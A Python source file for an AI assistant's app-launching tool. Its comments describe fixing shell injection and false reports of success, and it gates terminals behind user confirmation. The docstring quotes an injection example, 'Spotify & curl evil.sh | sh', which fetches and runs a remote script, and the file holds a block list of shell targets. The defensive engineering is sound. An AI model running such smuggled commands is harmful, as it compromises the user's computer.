"""
open_app.py — launch an application, and say honestly whether it opened.

TWO THINGS THIS FILE USED TO GET WRONG
    It ran the model's text through a shell:

        subprocess.Popen(app_name, shell=True, ...)
        subprocess.Popen(f"start {app_name}", shell=True)

    `app_name` is free text Gemini wrote. "Spotify" works, and so does
    "Spotify & curl evil.sh | sh". Every launch now goes through
    `core/exec_safe.py`, which takes an argv list and has no shell to inject
    into.

    And it reported success it had not established. `_launch_linux` returned
    True after `xdg-open` regardless of the exit code, so "Could not confirm
    that X launched" was never reached and the assistant said it had opened
    something that was not installed. Launching is now verified against the
    process table where psutil is available, and where it is not, the wording
    says what was actually established rather than implying more.
"""

import os
import platform
import re
import time

try:
    import psutil
    _PSUTIL = True
except ImportError:
    _PSUTIL = False

from core import capabilities, exec_safe

_SYSTEM = platform.system()

# Opening a terminal is one step from a command line the assistant never had to
# justify, so it is a different capability from opening Spotify. Matched against
# the *normalised* name, so "cmd", "powershell" and "bash" are all caught however
# the model spelled them.
_SHELL_TARGETS = frozenset({
    "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "bash", "sh",
    "zsh", "wt", "windowsterminal", "terminal", "x-terminal-emulator",
    "gnome-terminal", "konsole", "xfce4-terminal", "xterm", "lxterminal",
    "mate-terminal", "tilix", "alacritty", "kitty", "git-bash",
    "regedit", "regedit.exe", "cmd /c", "msiexec", "msiexec.exe",
})

# An app name is typed into the Start Menu / Spotlight as a fallback, so it must
# not be able to carry a newline (which would submit) or control characters.
_APP_NAME_MAX = 80
_CONTROL_CHARS = re.compile(r"[\x00-\x1f\x7f]")


def _clean_app_name(raw: str) -> str:
    """Strip anything that would turn a name into an instruction.

    Relevant because two of the fallbacks type this string: the Windows Start
    Menu search and macOS Spotlight. A newline there is an Enter key."""
    text = _CONTROL_CHARS.sub("", str(raw or "")).strip()
    return text[:_APP_NAME_MAX]


def _is_shell_target(normalized: str, raw: str) -> bool:
    for candidate in (normalized, raw):
        key = str(candidate or "").strip().lower()
        if key in _SHELL_TARGETS:
            return True
        if key.split()[0] in _SHELL_TARGETS if key.split() else False:
            return True
    return False

_APP_ALIASES: dict[str, dict[str, str]] = {

    "chrome":             {"Windows": "chrome",                  "Darwin": "Google Chrome",        "Linux": "google-chrome"},
    "google chrome":      {"Windows": "chrome",                  "Darwin": "Google Chrome",        "Linux": "google-chrome"},
    "firefox":            {"Windows": "firefox",                 "Darwin": "Firefox",              "Linux": "firefox"},
    "edge":               {"Windows": "msedge",                  "Darwin": "Microsoft Edge",       "Linux": "microsoft-edge"},
    "brave":              {"Windows": "brave",                   "Darwin": "Brave Browser",        "Linux": "brave-browser"},
    "safari":             {"Windows": "msedge",                  "Darwin": "Safari",               "Linux": "firefox"},
    "opera":              {"Windows": "opera",                   "Darwin": "Opera",                "Linux": "opera"},
    "whatsapp":           {"Windows": "WhatsApp",                "Darwin": "WhatsApp",             "Linux": "whatsapp"},
    "telegram":           {"Windows": "Telegram",                "Darwin": "Telegram",             "Linux": "telegram"},
    "discord":            {"Windows": "Discord",                 "Darwin": "Discord",              "Linux": "discord"},
    "slack":              {"Windows": "Slack",                   "Darwin": "Slack",                "Linux": "slack"},
    "zoom":               {"Windows": "Zoom",                    "Darwin": "zoom.us",              "Linux": "zoom"},
    "teams":              {"Windows": "msteams",                 "Darwin": "Microsoft Teams",      "Linux": "teams"},
    "skype":              {"Windows": "skype",                   "Darwin": "Skype",                "Linux": "skype"},
    "signal":             {"Windows": "signal",                  "Darwin": "Signal",               "Linux": "signal"},
    "spotify":            {"Windows": "Spotify",                 "Darwin": "Spotify",              "Linux": "spotify"},
    "vlc":                {"Windows": "vlc",                     "Darwin": "VLC",                  "Linux": "vlc"},
    "netflix":            {"Windows": "Netflix",                 "Darwin": "Netflix",              "Linux": "firefox"},
    "vscode":             {"Windows": "code",                    "Darwin": "Visual Studio Code",   "Linux": "code"},
    "visual studio code": {"Windows": "code",                    "Darwin": "Visual Studio Code",   "Linux": "code"},
    "code":               {"Windows": "code",                    "Darwin": "Visual Studio Code",   "Linux": "code"},
    "terminal":           {"Windows": "wt",                      "Darwin": "Terminal",             "Linux": "x-terminal-emulator"},
    "cmd":                {"Windows": "cmd.exe",                 "Darwin": "Terminal",             "Linux": "bash"},
    "powershell":         {"Windows": "powershell.exe",          "Darwin": "Terminal",             "Linux": "bash"},
    "postman":            {"Windows": "Postman",                 "Darwin": "Postman",              "Linux": "postman"},
    "git":                {"Windows": "git-bash",                "Darwin": "Terminal",             "Linux": "bash"},
    "figma":              {"Windows": "Figma",                   "Darwin": "Figma",                "Linux": "figma"},
    "blender":            {"Windows": "blender",                 "Darwin": "Blender",              "Linux": "blender"},
    "word":               {"Windows": "winword",                 "Darwin": "Microsoft Word",       "Linux": "libreoffice --writer"},
    "excel":              {"Windows": "excel",                   "Darwin": "Microsoft Excel",      "Linux": "libreoffice --calc"},
    "powerpoint":         {"Windows": "powerpnt",                "Darwin": "Microsoft PowerPoint", "Linux": "libreoffice --impress"},
    "libreoffice":        {"Windows": "soffice",                 "Darwin": "LibreOffice",          "Linux": "libreoffice"},
    "notepad":            {"Windows": "notepad.exe",             "Darwin": "TextEdit",             "Linux": "gedit"},
    "textedit":           {"Windows": "notepad.exe",             "Darwin": "TextEdit",             "Linux": "gedit"},
    "explorer":           {"Windows": "explorer.exe",            "Darwin": "Finder",               "Linux": "nautilus"},
    "file explorer":      {"Windows": "explorer.exe",            "Darwin": "Finder",               "Linux": "nautilus"},
    "finder":             {"Windows": "explorer.exe",            "Darwin": "Finder",               "Linux": "nautilus"},
    "task manager":       {"Windows": "taskmgr.exe",             "Darwin": "Activity Monitor",     "Linux": "gnome-system-monitor"},
    "settings":           {"Windows": "ms-settings:",            "Darwin": "System Preferences",   "Linux": "gnome-control-center"},
    "calculator":         {"Windows": "calc.exe",                "Darwin": "Calculator",           "Linux": "gnome-calculator"},
    "paint":              {"Windows": "mspaint.exe",             "Darwin": "Preview",              "Linux": "gimp"},
    "instagram":          {"Windows": "Instagram",               "Darwin": "Instagram",            "Linux": "firefox"},
    "tiktok":             {"Windows": "TikTok",                  "Darwin": "TikTok",               "Linux": "firefox"},
    "notion":             {"Windows": "Notion",                  "Darwin": "Notion",               "Linux": "notion"},
    "obsidian":           {"Windows": "Obsidian",                "Darwin": "Obsidian",             "Linux": "obsidian"},
    "capcut":             {"Windows": "CapCut",                  "Darwin": "CapCut",               "Linux": "capcut"},
    "steam":              {"Windows": "steam",                   "Darwin": "Steam",                "Linux": "steam"},
    "epic":               {"Windows": "EpicGamesLauncher",       "Darwin": "Epic Games Launcher",  "Linux": "legendary"},
    "epic games":         {"Windows": "EpicGamesLauncher",       "Darwin": "Epic Games Launcher",  "Linux": "legendary"},
}


def _normalize(raw: str) -> str:
    key = raw.lower().strip()

    if key in _APP_ALIASES:
        return _APP_ALIASES[key].get(_SYSTEM, raw)

    for alias_key, os_map in _APP_ALIASES.items():
        if alias_key in key or key in alias_key:
            return os_map.get(_SYSTEM, raw)

    return raw  

def _running_names() -> set:
    """Lower-cased process names currently running, or an empty set.

    Used to tell "I started it" apart from "it is actually open", which is the
    difference between the old return value and an honest one."""
    if not _PSUTIL:
        return set()
    names = set()
    try:
        for proc in psutil.process_iter(["name"]):
            try:
                name = (proc.info.get("name") or "").lower()
                if name:
                    names.add(name)
            except Exception:
                continue
    except Exception:
        return set()
    return names


def _looks_running(app_name: str, before: set) -> bool:
    """Did a process matching `app_name` appear that was not there before?

    Deliberately conservative: an app that was already open counts as running
    (the user asked for it to be open, and it is), and a match is a substring
    either way round so "code" finds "Code.exe" and "chrome" finds
    "chrome.exe"."""
    stem = str(app_name or "").lower().strip()
    stem = stem.rsplit(".", 1)[0] if "." in stem else stem
    stem = stem.replace(" ", "")
    if not stem:
        return False
    for name in _running_names():
        flat = name.rsplit(".", 1)[0].replace(" ", "")
        if stem in flat or flat in stem:
            return True
    return False


def _settle_and_check(app_name: str, before: set, waits=(0.8, 1.2, 2.0)) -> bool:
    """Give the app a moment to appear, checking as we go.

    Cold-starting Photoshop is not instant, and neither is Steam. Polling a few
    times beats one long sleep: a fast app returns quickly and a slow one still
    gets its chance."""
    if not _PSUTIL:
        return False
    for wait in waits:
        time.sleep(wait)
        if _looks_running(app_name, before):
            return True
    return False


def _launch_windows(app_name: str) -> tuple[bool, str]:
    before = _running_names()

    # A settings URI ("ms-settings:") is not a program — ShellExecute handles
    # it. os.startfile is the no-shell way to do that; the old code built
    # f"start {app_name}" and handed it to cmd.
    if ":" in app_name and not app_name[1:2] == ":":
        try:
            os.startfile(app_name)          # noqa: S606 — URI, not a command line
            time.sleep(1.0)
            return True, f"Opened {app_name}."
        except Exception as e:
            return False, f"Could not open {app_name}: {e}"

    resolved = exec_safe.resolve_program(app_name) or exec_safe.resolve_program(
        app_name.split(".")[0]
    )
    if resolved:
        started, detail = exec_safe.spawn([resolved])
        if started:
            if _settle_and_check(app_name, before):
                return True, f"Opened {app_name}."
            return True, (f"I started {app_name}, but could not confirm its "
                          f"window is up yet — it may still be loading.")
        return False, detail

    # Start Menu search. The name has already been stripped of control
    # characters, so this types a name and nothing else.
    try:
        import pyautogui
        pyautogui.PAUSE = 0.1
        pyautogui.press("win")
        time.sleep(0.7)
        pyautogui.write(app_name, interval=0.05)
        time.sleep(0.9)
        pyautogui.press("enter")
        if _settle_and_check(app_name, before, waits=(1.5, 1.5, 2.0)):
            return True, f"Opened {app_name}."
        return False, (f"I searched the Start Menu for {app_name} but no matching "
                       f"program started. It may not be installed.")
    except Exception as e:
        return False, f"Could not start {app_name}: {e}"


def _launch_macos(app_name: str) -> tuple[bool, str]:
    before = _running_names()

    for candidate in (app_name, f"{app_name}.app"):
        result = exec_safe.run(["open", "-a", candidate], timeout=15)
        if result.ok:
            time.sleep(1.0)
            return True, f"Opened {app_name}."

    binary = exec_safe.resolve_program(app_name) or exec_safe.resolve_program(
        app_name.lower()
    )
    if binary:
        started, detail = exec_safe.spawn([binary])
        if started:
            if _settle_and_check(app_name, before):
                return True, f"Opened {app_name}."
            return True, (f"I started {app_name}, but could not confirm it is up "
                          f"yet.")
        return False, detail

    try:
        import pyautogui
        pyautogui.hotkey("command", "space")
        time.sleep(0.6)
        pyautogui.write(app_name, interval=0.05)
        time.sleep(0.8)
        pyautogui.press("enter")
        if _settle_and_check(app_name, before, waits=(1.5, 1.5, 2.0)):
            return True, f"Opened {app_name}."
        return False, (f"I searched Spotlight for {app_name} but nothing matching "
                       f"started. It may not be installed.")
    except Exception as e:
        return False, f"Could not start {app_name}: {e}"


_LINUX_TERMINAL_FALLBACKS = [
    "x-terminal-emulator", "gnome-terminal", "konsole", "xfce4-terminal",
    "xterm", "lxterminal", "mate-terminal", "tilix", "alacritty", "kitty",
]


def _launch_linux(app_name: str) -> tuple[bool, str]:
    before = _running_names()

    if app_name in ("x-terminal-emulator", "gnome-terminal", "terminal"):
        for term in _LINUX_TERMINAL_FALLBACKS:
            path = exec_safe.resolve_program(term)
            if path:
                started, detail = exec_safe.spawn([path])
                if started:
                    time.sleep(1.0)
                    return True, f"Opened {term}."
                return False, detail

    binary = (
        exec_safe.resolve_program(app_name)
        or exec_safe.resolve_program(app_name.lower())
        or exec_safe.resolve_program(app_name.lower().replace(" ", "-"))
        or exec_safe.resolve_program(app_name.lower().replace(" ", "_"))
    )
    if binary:
        started, detail = exec_safe.spawn([binary])
        if started:
            if _settle_and_check(app_name, before):
                return True, f"Opened {app_name}."
            return True, (f"I started {app_name}, but could not confirm its window "
                          f"is up yet.")
        return False, detail

    # gtk-launch takes a .desktop id. Its exit code is meaningful, unlike
    # xdg-open's, so it is tried first and its answer is believed.
    for desktop_name in (
        app_name.lower(),
        app_name.lower().replace(" ", "-"),
        app_name.lower().replace(" ", ""),
    ):
        result = exec_safe.run(["gtk-launch", desktop_name], timeout=10)
        if result.ok:
            if _settle_and_check(app_name, before):
                return True, f"Opened {app_name}."
            return True, f"I launched {app_name}; it may still be starting."

    # xdg-open last, and its return code is actually checked this time. The old
    # code returned True here unconditionally, which is why "open Photoshop" on
    # a machine without Photoshop reported success.
    result = exec_safe.run(["xdg-open", app_name], timeout=10)
    if result.ok and _settle_and_check(app_name, before):
        return True, f"Opened {app_name}."
    if result.ok:
        return False, (f"I asked the desktop to open {app_name} and it did not "
                       f"report an error, but no matching program appeared.")
    return False, (f"Could not open {app_name}. {result.failure_detail(160)}".strip())


_OS_LAUNCHERS = {
    "Windows": _launch_windows,
    "Darwin":  _launch_macos,
    "Linux":   _launch_linux,
}

def open_app(
    parameters=None,
    response=None,
    player=None,
    session_memory=None,
) -> str:
    app_name = _clean_app_name((parameters or {}).get("app_name", ""))

    if not app_name:
        return "No application name provided."

    launcher = _OS_LAUNCHERS.get(_SYSTEM)
    if launcher is None:
        return f"Unsupported operating system: {_SYSTEM}"

    normalized = _normalize(app_name)
    print(f"[open_app] Launching: '{app_name}' -> '{normalized}' ({_SYSTEM})")

    if player:
        player.write_log(f"[open_app] {app_name}")

    try:
        opened, detail = launcher(normalized)
        if opened:
            return detail
        if normalized.lower() != app_name.lower():
            opened, retry_detail = launcher(app_name)
            if opened:
                return retry_detail
            detail = retry_detail or detail
        # Not "could not confirm" any more when we actually established it did
        # not start: the caller gets the real reason.
        return detail or (
            f"Could not open {app_name}. It may not be installed."
        )
    except Exception as e:
        print(f"[open_app] Error: {e}")
        return f"Failed to open {app_name}: {e}"


def _capability(params: dict) -> str:
    """Opening Spotify and opening a shell are not the same risk."""
    raw = _clean_app_name((params or {}).get("app_name", ""))
    if _is_shell_target(_normalize(raw), raw):
        return capabilities.APP_LAUNCH_SHELL
    return capabilities.APP_LAUNCH


def _guard(params: dict) -> dict:
    raw = _clean_app_name((params or {}).get("app_name", ""))
    if _is_shell_target(_normalize(raw), raw):
        return {
            "summary": f"Open a command shell ({raw})",
            "detail": ("A terminal can run any command on this computer. "
                       "Only allow this if you asked for a shell."),
            "target": raw,
        }
    return {"summary": f"Open {raw}", "target": raw}


# -- Tool declaration (auto-discovered by core/action_loader.py) --------------
TOOL = {
    "name": "open_app",
    "description": "Opens any application on the computer. Use this whenever the user asks to open, launch, or start any app, website, or program. Always call this tool - never just say you opened it.",
    "parameters": {
        "type": "OBJECT",
        "properties": {
            "app_name": {
                "type": "STRING",
                "description": "Exact name of the application (e.g. 'WhatsApp', 'Chrome', 'Spotify')"
            }
        },
        "required": [
            "app_name"
        ]
    },
    "handler": open_app,
    "capability": _capability,
    "guard": _guard,
}
